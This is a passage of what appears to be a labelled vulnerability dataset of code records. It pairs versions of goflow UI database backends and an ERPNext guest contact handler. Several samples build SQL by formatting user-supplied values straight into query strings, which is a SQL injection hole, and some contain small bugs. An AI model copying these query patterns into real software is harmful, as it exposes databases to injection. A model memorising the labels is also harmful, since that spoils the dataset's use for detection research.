display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'int'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass PortColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'port'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = %s\".format(self.name, value)\n        return self.filter_string\n\nclass Coalesce:\n    def __init__(self, name, columns, filter_func, display_name):\n        \"\"\"\n        Coalesce\n        Select from a list of columns whatever is not null\n        :param columns (List): Column objects\n        \"\"\"\n        self.name = name\n        self.columns = columns\n        # We assume that the passed columns are of roughly the same type\n        self.type = columns[0].type\n        self.column_selects = []\n        for c in columns:\n            self.column_selects.append(c.select())\n\n        self.filter_string = None\n        self.filter_func = filter_func\n        self.display_name = display_name\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        fields = \", \".join(self.column_selects)\n        return \"COALESCE({0}) AS {1}\".format(fields, self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = self.filter_func(value, op)\n\nclass Schema:\n    \"\"\"\n    Schema\n\n    Defines the backend schema\n    Changes to the backend (naming, etc.) should be reflected here.\n    \"\"\"\n    def __init__(self):\n        # Default\n        self.limit = 10\n\n        self.column_order = [\n            \"last_switched\",\n            \"src_ip\",\n            \"src_port\",\n            \"dst_ip\",\n            \"dst_port\",\n            \"in_bytes\",\n        ]\n        src_ip_col = IP4Column(\"src_ip\", \"Source IP\")\n        src_ipv6_col = IP6Column(\"src_ipv6\", \"Source IPv6\")\n        dst_ip_col = IP4Column(\"dst_ip\", \"Destination IP\")\n        dst_ipv6_col = IP6Column(\"dst_ipv6\", \"DestinationIPv6\")\n\n        self.filter_val_list = []\n\n        # Columns\n        self.columns = {\n            \"last_switched\": Column(\"last_switched\", \"Last Switched\"),\n            \"src_ip\": Coalesce(\"src_c_ip\", [src_ip_col, src_ipv6_col], src_ip_col.filter, \"Source IP\"),\n            \"src_port\": PortColumn(\"src_port\", \"Source Port\"),\n            \"dst_ip\": Coalesce(\"dst_c_ip\", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, \"Destination IP\"),\n            \"dst_port\": PortColumn(\"dst_port\", \"Destination Port\"),\n            \"in_bytes\": IntColumn(\"in_bytes\", \"Input bytes\"),\n            \"in_pkts\": IntColumn(\"in_pkts\", \"Input Packets\"),\n        }\n\n        # Supported queries\n        self.QUERIES = {\n            \"TOPN\": self.topn\n        }\n\n        self.filters = []\n\n        self.filter_map = {\n            \"(\\d+\\-\\d+\\-\\d+)\": \"last_switched\",\n            \"src (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"src_ip\",\n            \"dst (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"dst_ip\",\n            \"src ([0-9]+)($|\\s)\": \"src_port\",\n            \"dst ([0-9]+)($|\\s)\": \"dst_port\",\n        }\n\n    def add_filter(self, value, op=\"=\"):\n        for regex, column in self.filter_map.items():\n            if re.search(regex, value):\n                m = re.search(regex, value)\n                v = m.group(1)\n                self.columns[column].filter(v, op)\n                self.filter_val_list.append(v)\n\n    def build_filter_string(self):\n        s = 'WHERE '\n        l = []\n        for c in self.columns.values():\n            if c.filter_string:\n                l.append(c.filter_string)\n\n        if len(l) > 0:\n            return s + \" AND \".join(l)\n        else:\n            return ''\n\n    def get_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            result[col_name] = col.get_display_name()\n\n        return result\n\n    def get_int_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            if col.type is \"int\":\n                result[col_name] = col.get_display_name()\n\n        return result\n\n    def topn(self, column):\n        count = \"last_switched\"\n        q = \"\"\"\n        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), count, self.build_filter_string())\n        return self.query_boilerplate(q)\n\n    def topn_sum(self, column, sum_by):\n        q = \"\"\"\n        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)\n        return self.query_boilerplate(q)\n\n    def flows(self):\n        c = []\n        for col in self.column_order:\n            c.append(self.columns[col].select())\n        q = \"\"\"\n        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC\n        \"\"\".format(self.build_filter_string(), \", \".join(c))\n        return self.query_boilerplate(q)\n\n    def query_boilerplate(self, q):\n        q = q + \"\"\"LIMIT {0}\"\"\".format(self.limit)\n        return q\n\n    def query(self, db, q):\n        cursor = db.cursor()\n        cursor.execute(q, self.filter_val_list)\n        return cursor/n/n/n", "label": 0}, {"id": "abd763746d7ff1d40571fed8ed46fce2211f3deb", "code": "/gfui/backends/Mysql/mysql.py/n/nfrom gfui.backends.default import Backend\nimport mysql.connector\nfrom gfui.chartgraph import Graph, Table\nimport re\nimport ipaddress\nimport os\n\nclass Mysql_backend(Backend):\n    def __init__(self, OPTIONS):\n        super().__init__()\n        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']\n        self.parse_options(OPTIONS)\n        self.columns = {}\n\n        pw = os.environ.get(\"SQL_PASSWORD\")\n        if not pw:\n            pw = self.OPTIONS['SQL_PASSWORD']\n\n        self.db = mysql.connector.connect(\n            host=self.OPTIONS['SQL_SERVER'],\n            user=self.OPTIONS['SQL_USERNAME'],\n            passwd=pw\n        )\n\n        self.schema = Schema()\n\n        self.filters = []\n\n    def get_columns(self):\n        return self.schema.get_columns()\n\n    def add_filter(self, op, value):\n        self.schema.add_filter(value, op)\n\n    def get_int_columns(self):\n        return self.schema.get_int_columns()\n\n    def flow_table(self, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS = self.schema.flows()\n\n        cursor = db.cursor()\n        cursor.execute(\"USE testgoflow\")\n        cursor.execute(FLOWS)\n        r = cursor.fetchall()\n        t = Table()\n        t = t.table_from_rows(r, self.schema.column_order)\n        return t\n\n    def topn_sum_graph(self, field, sum_by, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)\n\n        cursor = db.cursor()\n        cursor.execute(\"USE testgoflow\")\n        cursor.execute(FLOWS_PER_IP)\n        r = cursor.fetchall()\n        g = Graph()\n        g.name = \"TopN {0}\".format(field)\n        g.set_headers([\n            field,\n            \"Total\"\n        ])\n        g.graph_from_rows(r, 0)\n        return g\n\nclass Column:\n    \"\"\"\n    Column\n\n    Column handling class.\n    Governs how query strings are built and helper functons for returned data.\n    \"\"\"\n    def __init__(self, name, display_name=None):\n        self.name = name\n        self.display_name = display_name\n        self.type = 'text'\n        self.filter_string = None\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        if self.filter_string:\n            self.filter_string = self.filter_string + \"AND {2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n        else:\n            self.filter_string = \"{2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n\nclass IP4Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip\"\n\n    def select(self):\n        return \"inet_ntoa({0})\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IP6Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip6\"\n\n    def select(self):\n        return \"inet6_ntoa({0})\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IntColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'int'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass PortColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'port'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass Coalesce:\n    def __init__(self, name, columns, filter_func, display_name):\n        \"\"\"\n        Coalesce\n        Select from a list of columns whatever is not null\n        :param columns (List): Column objects\n        \"\"\"\n        self.name = name\n        self.columns = columns\n        # We assume that the passed columns are of roughly the same type\n        self.type = columns[0].type\n        self.column_selects = []\n        for c in columns:\n            self.column_selects.append(c.select())\n\n        self.filter_string = None\n        self.filter_func = filter_func\n        self.display_name = display_name\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        fields = \", \".join(self.column_selects)\n        return \"COALESCE({0}) AS {1}\".format(fields, self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = self.filter_func(value, op)\n        print(self.filter_string)\n\nclass Schema:\n    \"\"\"\n    Schema\n\n    Defines the backend schema\n    Changes to the backend (naming, etc.) should be reflected here.\n    \"\"\"\n    def __init__(self):\n        # Default\n        self.limit = 10\n\n        self.column_order = [\n            \"last_switched\",\n            \"src_ip\",\n            \"src_port\",\n            \"dst_ip\",\n            \"dst_port\",\n            \"in_bytes\",\n        ]\n        src_ip_col = IP4Column(\"src_ip\", \"Source IP\")\n        src_ipv6_col = IP6Column(\"src_ipv6\", \"Source IPv6\")\n        dst_ip_col = IP4Column(\"dst_ip\", \"Destination IP\")\n        dst_ipv6_col = IP6Column(\"dst_ipv6\", \"DestinationIPv6\")\n\n        # Columns\n        self.columns = {\n            \"last_switched\": Column(\"last_switched\", \"Last Switched\"),\n            \"src_ip\": Coalesce(\"src_c_ip\", [src_ip_col, src_ipv6_col], src_ip_col.filter, \"Source IP\"),\n            \"src_port\": PortColumn(\"src_port\", \"Source Port\"),\n            \"dst_ip\": Coalesce(\"dst_c_ip\", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, \"Destination IP\"),\n            \"dst_port\": PortColumn(\"dst_port\", \"Destination Port\"),\n            \"in_bytes\": IntColumn(\"in_bytes\", \"Input bytes\"),\n            \"in_pkts\": IntColumn(\"in_pkts\", \"Input Packets\"),\n        }\n\n        # Supported queries\n        self.QUERIES = {\n            \"TOPN\": self.topn\n        }\n\n        self.filters = []\n\n        self.filter_map = {\n            \"(\\d+\\-\\d+\\-\\d+)\": \"last_switched\",\n            \"src (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"src_ip\",\n            \"dst (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"dst_ip\",\n            \"src ([0-9]+)($|\\s)\": \"src_port\",\n            \"dst ([0-9]+)($|\\s)\": \"dst_port\",\n        }\n\n    def add_filter(self, value, op=\"=\"):\n        for regex, column in self.filter_map.items():\n            if re.search(regex, value):\n                m = re.search(regex, value)\n                v = m.group(1)\n                self.columns[column].filter(v, op)\n\n    def build_filter_string(self):\n        s = 'WHERE '\n        l = []\n        for c in self.columns.values():\n            if c.filter_string:\n                l.append(c.filter_string)\n\n        if len(l) > 0:\n            return s + \" AND \".join(l)\n        else:\n            return ''\n\n    def get_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            result[col_name] = col.get_display_name()\n\n        return result\n\n    def get_int_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            if col.type is \"int\":\n                result[col_name] = col.get_display_name()\n\n        return result\n\n    def topn(self, column):\n        count = \"last_switched\"\n        q = \"\"\"\n        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), count, self.build_filter_string())\n        return self.query_boilerplate(q)\n\n    def topn_sum(self, column, sum_by):\n        q = \"\"\"\n        SELECT {0}, sum({1}) AS c FROM test_goflow_records {2} GROUP BY {3} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)\n        print(q)\n        return self.query_boilerplate(q)\n\n    def flows(self):\n        c = []\n        for col in self.column_order:\n            c.append(self.columns[col].select())\n        q = \"\"\"\n        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC\n        \"\"\".format(self.build_filter_string(), \", \".join(c))\n        print(q)\n        return self.query_boilerplate(q)\n\n    def query_boilerplate(self, q):\n        q = q + \"\"\"LIMIT {0}\"\"\".format(self.limit)\n        return q\n/n/n/n/gfui/backends/Timescaledb/timescaledb.py/n/nfrom gfui.backends.default import Backend\nimport psycopg2\nfrom gfui.chartgraph import Graph, Table\nimport re\nimport ipaddress\nimport os\n\nclass Timescaledb_backend(Backend):\n    def __init__(self, OPTIONS):\n        super().__init__()\n        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']\n        self.parse_options(OPTIONS)\n        self.columns = {}\n\n        pw = os.environ.get(\"SQL_PASSWORD\")\n        if not pw:\n            pw = self.OPTIONS['SQL_PASSWORD']\n\n        self.db = psycopg2.connect(\n            \"dbname={0} user={1} password={2} host={3}\".format(\n                self.OPTIONS['SQL_DB'],\n                self.OPTIONS['SQL_USERNAME'],\n                pw,\n                self.OPTIONS['SQL_SERVER']\n            )\n        )\n\n        self.schema = Schema()\n\n        self.filters = []\n\n    def get_columns(self):\n        return self.schema.get_columns()\n\n    def add_filter(self, op, value):\n        self.schema.add_filter(value, op)\n\n    def get_int_columns(self):\n        return self.schema.get_int_columns()\n\n    def flow_table(self, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS = self.schema.flows()\n\n        cursor = self.schema.query(db, FLOWS)\n        r = cursor.fetchall()\n        t = Table()\n        t = t.table_from_rows(r, self.schema.column_order)\n        return t\n\n    def topn_sum_graph(self, field, sum_by, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)\n\n        cursor = db.cursor()\n        cursor.execute(FLOWS_PER_IP)\n        r = cursor.fetchall()\n        g = Graph()\n        g.name = \"TopN {0}\".format(field)\n        g.set_headers([\n            field,\n            \"Total\"\n        ])\n        g.graph_from_rows(r, 0)\n        return g\n\nclass Column:\n    \"\"\"\n    Column\n\n    Column handling class.\n    Governs how query strings are built and helper functons for returned data.\n    \"\"\"\n    def __init__(self, name, display_name=None):\n        self.name = name\n        self.display_name = display_name\n        self.type = 'text'\n        self.filter_string = None\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        if self.filter_string:\n            self.filter_string = self.filter_string + \"AND {2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n        else:\n            self.filter_string = \"{2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n\nclass IP4Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            self.filter_string = \"({0} << '{1}'\".format(self.name, value)\n        else:\n            self.filter_string = \"{0} = '{1}'\".format(self.name, value)\n\n        return self.filter_string\n\nclass IP6Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip6\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IntColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'int'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass PortColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'port'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = %s\".format(self.name, value)\n        return self.filter_string\n\nclass Coalesce:\n    def __init__(self, name, columns, filter_func, display_name):\n        \"\"\"\n        Coalesce\n        Select from a list of columns whatever is not null\n        :param columns (List): Column objects\n        \"\"\"\n        self.name = name\n        self.columns = columns\n        # We assume that the passed columns are of roughly the same type\n        self.type = columns[0].type\n        self.column_selects = []\n        for c in columns:\n            self.column_selects.append(c.select())\n\n        self.filter_string = None\n        self.filter_func = filter_func\n        self.display_name = display_name\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        fields = \", \".join(self.column_selects)\n        return \"COALESCE({0}) AS {1}\".format(fields, self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = self.filter_func(value, op)\n\nclass Schema:\n    \"\"\"\n    Schema\n\n    Defines the backend schema\n    Changes to the backend (naming, etc.) should be reflected here.\n    \"\"\"\n    def __init__(self):\n        # Default\n        self.limit = 10\n\n        self.column_order = [\n            \"last_switched\",\n            \"src_ip\",\n            \"src_port\",\n            \"dst_ip\",\n            \"dst_port\",\n            \"in_bytes\",\n        ]\n        src_ip_col = IP4Column(\"src_ip\", \"Source IP\")\n        src_ipv6_col = IP6Column(\"src_ipv6\", \"Source IPv6\")\n        dst_ip_col = IP4Column(\"dst_ip\", \"Destination IP\")\n        dst_ipv6_col = IP6Column(\"dst_ipv6\", \"DestinationIPv6\")\n\n        self.filter_val_list = []\n\n        # Columns\n        self.columns = {\n            \"last_switched\": Column(\"last_switched\", \"Last Switched\"),\n            \"src_ip\": Coalesce(\"src_c_ip\", [src_ip_col, src_ipv6_col], src_ip_col.filter, \"Source IP\"),\n            \"src_port\": PortColumn(\"src_port\", \"Source Port\"),\n            \"dst_ip\": Coalesce(\"dst_c_ip\", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, \"Destination IP\"),\n            \"dst_port\": PortColumn(\"dst_port\", \"Destination Port\"),\n            \"in_bytes\": IntColumn(\"in_bytes\", \"Input bytes\"),\n            \"in_pkts\": IntColumn(\"in_pkts\", \"Input Packets\"),\n        }\n\n        # Supported queries\n        self.QUERIES = {\n            \"TOPN\": self.topn\n        }\n\n        self.filters = []\n\n        self.filter_map = {\n            \"(\\d+\\-\\d+\\-\\d+)\": \"last_switched\",\n            \"src (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"src_ip\",\n            \"dst (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"dst_ip\",\n            \"src ([0-9]+)($|\\s)\": \"src_port\",\n            \"dst ([0-9]+)($|\\s)\": \"dst_port\",\n        }\n\n    def add_filter(self, value, op=\"=\"):\n        for regex, column in self.filter_map.items():\n            if re.search(regex, value):\n                m = re.search(regex, value)\n                v = m.group(1)\n                self.columns[column].filter(v, op)\n                self.filter_val_list.append(v)\n\n    def build_filter_string(self):\n        s = 'WHERE '\n        l = []\n        for c in self.columns.values():\n            if c.filter_string:\n                l.append(c.filter_string)\n\n        if len(l) > 0:\n            return s + \" AND \".join(l)\n        else:\n            return ''\n\n    def get_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            result[col_name] = col.get_display_name()\n\n        return result\n\n    def get_int_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            if col.type is \"int\":\n                result[col_name] = col.get_display_name()\n\n        return result\n\n    def topn(self, column):\n        count = \"last_switched\"\n        q = \"\"\"\n        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), count, self.build_filter_string())\n        return self.query_boilerplate(q)\n\n    def topn_sum(self, column, sum_by):\n        q = \"\"\"\n        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)\n        return self.query_boilerplate(q)\n\n    def flows(self):\n        c = []\n        for col in self.column_order:\n            c.append(self.columns[col].select())\n        q = \"\"\"\n        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC\n        \"\"\".format(self.build_filter_string(), \", \".join(c))\n        return self.query_boilerplate(q)\n\n    def query_boilerplate(self, q):\n        q = q + \"\"\"LIMIT {0}\"\"\".format(self.limit)\n        return q\n\n    def query(self, db, q):\n        cursor = db.cursor()\n        cursor.execute(q, self.filter_val_list)\n        return cursor/n/n/n", "label": 1}, {"id": "9acb885e60f77cd4e9ea8c98bdc39c18abcac731", "code": "erpnext/templates/utils.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# License: GNU General Public License v3. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe, json\nfrom frappe import _\nfrom frappe.utils import cint, formatdate\n\n@frappe.whitelist(allow_guest=True)\ndef send_message(subject=\"Website Query\", message=\"\", sender=\"\", status=\"Open\"):\n\tfrom frappe.www.contact import send_message as website_send_message\n\tlead = customer = None\n\n\twebsite_send_message(subject, message, sender)\n\n\tcustomer = frappe.db.sql(\"\"\"select distinct dl.link_name from `tabDynamic Link` dl\n\t\tleft join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'\n\t\tand c.email_id = %s\"\"\", sender)\n\n\tif not customer:\n\t\tlead = frappe.db.get_value('Lead', dict(email_id=sender))\n\t\tif not lead:\n\t\t\tnew_lead = frappe.get_doc(dict(\n\t\t\t\tdoctype='Lead',\n\t\t\t\temail_id = sender,\n\t\t\t\tlead_name = sender.split('@')[0].title()\n\t\t\t)).insert(ignore_permissions=True)\n\n\topportunity = frappe.get_doc(dict(\n\t\tdoctype ='Opportunity',\n\t\tenquiry_from = 'Customer' if customer else 'Lead',\n\t\tstatus = 'Open',\n\t\ttitle = subject,\n\t\tcontact_email = sender,\n\t\tto_discuss = message\n\t))\n\n\tif customer:\n\t\topportunity.customer = customer[0][0]\n\telif lead:\n\t\topportunity.lead = lead\n\telse:\n\t\topportunity.lead = new_lead.name\n\n\topportunity.insert(ignore_permissions=True)\n\n\tcomm = frappe.get_doc({\n\t\t\"doctype\":\"Communication\",\n\t\t\"subject\": subject,\n\t\t\"content\": message,\n\t\t\"sender\": sender,\n\t\t\"sent_or_received\": \"Received\",\n\t\t'reference_doctype': 'Opportunity',\n\t\t'reference_name': opportunity.name\n\t})\n\tcomm.insert(ignore_permissions=True)\n\n\treturn \"okay\"\n/n/n/n", "label": 0}, {"id": "9acb885e60f77cd4e9ea8c98bdc39c18abcac731", "code": "/erpnext/templates/utils.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# License: GNU General Public License v3. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe, json\nfrom frappe import _\nfrom frappe.utils import cint, formatdate\n\n@frappe.whitelist(allow_guest=True)\ndef send_message(subject=\"Website Query\", message=\"\", sender=\"\", status=\"Open\"):\n\tfrom frappe.www.contact import send_message as website_send_message\n\tlead = customer = None\n\n\twebsite_send_message(subject, message, sender)\n\n\tcustomer = frappe.db.sql(\"\"\"select distinct dl.link_name from `tabDynamic Link` dl\n\t\tleft join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'\n\t\tand c.email_id='{email_id}'\"\"\".format(email_id=sender))\n\n\tif not customer:\n\t\tlead = frappe.db.get_value('Lead', dict(email_id=sender))\n\t\tif not lead:\n\t\t\tnew_lead = frappe.get_doc(dict(\n\t\t\t\tdoctype='Lead',\n\t\t\t\temail_id = sender,\n\t\t\t\tlead_name = sender.split('@')[0].title()\n\t\t\t)).insert(ignore_permissions=True)\n\n\topportunity = frappe.get_doc(dict(\n\t\tdoctype ='Opportunity',\n\t\tenquiry_from = 'Customer' if customer else 'Lead',\n\t\tstatus = 'Open',\n\t\ttitle = subject,\n\t\tcontact_email = sender,\n\t\tto_discuss = message\n\t))\n\n\tif customer:\n\t\topportunity.customer = customer[0][0]\n\telif lead:\n\t\topportunity.lead = lead\n\telse:\n\t\topportunity.lead = new_lead.name\n\n\topportunity.insert(ignore_permissions=True)\n\n\tcomm = frappe.get_doc({\n\t\t\"doctype\":\"Communication\",\n\t\t\"subject\": subject,\n\t\t\"content\": message,\n\t\t\"sender\": sender,\n\t\t\"sent_or_received\": \"Received\",\n\t\t'reference_doctype': 'Opportunity',\n\t\t'reference_name': opportunity.name\n\t})\n\tcomm.insert(ignore_permissions=True)\n\n\treturn \"okay\"\n/n/n/n", "label": 1}, {"id": "9acb885e60f77cd4e9ea8c98bdc39c18abcac731", "code": "erpnext/templates/utils.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# License: GNU General Public License v3. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe, json\nfrom frappe import _\nfrom frappe.utils import cint, formatdate\n\n@frappe.whitelist(allow_guest=True)\ndef send_message(subject=\"Website Query\", message=\"\", sender=\"\", status=\"Open\"):\n\tfrom frappe.www.contact import send_message as website_send_message\n\tlead = customer = None\n\n\twebsite_send_message(subject, message, sender)\n\n\tcustomer = frappe.db.sql(\"\"\"select distinct dl.link_name from `tabDynamic Link` dl\n\t\tleft join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'\n\t\tand c.email_id = %s\"\"\", sender)\n\n\tif not customer:\n\t\tlead = frappe.db.get_value('Lead', dict(email_id=sender))\n\t\tif not lead:\n\t\t\tnew_lead = frappe.get_doc(dict(\n\t\t\t\tdoctype='Lead',\n\t\t\t\temail_id = sender,\n\t\t\t\tlead_name = sender.split('@')[0].title()\n\t\t\t)).insert(ignore_permissions=True)\n\n\topportunity = frappe.get_doc(dict(\n\t\tdoctype ='Opportunity',\n\t\tenquiry_from = 'Customer' if customer else 'Lead',\n\t\tstatus = 'Open',\n\t\ttitle = subject,\n\t\tcontact_email = sender,\n\t\tto_discuss = message\n\t))\n\n\tif customer:\n\t\topportunity.customer = customer[0][0]\n\telif lead:\n\t\topportunity.lead = lead\n\telse:\n\t\topportunity.lead = new_lead.name\n\n\topportunity.insert(ignore_permissions=True)\n\n\tcomm = frappe.get_doc({\n\t\t\"doctype\":\"Communication\",\n\t\t\"subject\": subject,\n\t\t\"content\": message,\n\t\t\"sender\": sender,\n\t\t\"sent_or_received\": \"Received\",\n\t\t'reference_doctype': 'Opportunity',\n\t\t'reference_name': opportunity.name\n\t})\n\tcomm.insert(ignore_permissions=True)\n\n\treturn \"okay\"\n/n/n/n", "label": 0}, {"id": "9acb885e60f77cd4e9ea8c98bdc39c18abcac731", "code": "/erpnext/templates/utils.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# License: GNU General Public License v3. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe, json\nfrom frappe import _\nfrom frappe.utils import cint, formatdate\n\n@frappe.whitelist(allow_guest=True)\ndef send_message(subject=\"Website Query\", message=\"\", sender=\"\", status=\"Open\"):\n\tfrom frappe.www.contact import send_message as website_send_message\n\tlead = customer = None\n\n\twebsite_send_message(subject, message, sender)\n\n\tcustomer = frappe.db.sql(\"\"\"select distinct dl.link_name from `tabDynamic Link` dl\n\t\tleft join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'\n\t\tand c.email_id='{email_id}'\"\"\".format(email_id=sender))\n\n\tif not customer:\n\t\tlead = frappe.db.get_value('Lead', dict(email_id=sender))\n\t\tif not lead:\n\t\t\tnew_lead = frappe.get_doc(dict(\n\t\t\t\tdoctype='Lead',\n\t\t\t\temail_id = sender,\n\t\t\t\tlead_name = sender.split('@')[0].title()\n\t\t\t)).insert(ignore_permissions=True)\n\n\topportunity = frappe.get_doc(dict(\n\t\tdoctype ='Opportunity',\n\t\tenquiry_from = 'Customer' if customer else 'Lead',\n\t\tstatus = 'Open',\n\t\ttitle = subject,\n\t\tcontact_email = sender,\n\t\tto_discuss = message\n\t))\n\n\tif customer:\n\t\topportunity.customer = customer[0][0]\n\telif lead:\n\t\topportunity.lead = lead\n\telse:\n\t\topportunity.lead = new_lead.name\n\n\topportunity.insert(ignore_permissions=True)\n\n\tcomm = frappe.get_doc({\n\t\t\"doctype\":\"Communication\",\n\t\t\"subject\": subject,\n\t\t\"content\": message,\n\t\t\"sender\": sender,\n\t\t\"sent_or_received\": \"Received\",\n\t\t'reference_doctype': 'Opportunity',\n\t\t'reference_name': opportunity.name\n\t})\n\tcomm.insert(ignore_permissions=True)\n\n\treturn \"okay\"\n/n/n/n", "label": 1}, {"id": "fe04bedc72e62fd4c4ee046a9af29fd81e9b3340", "code": 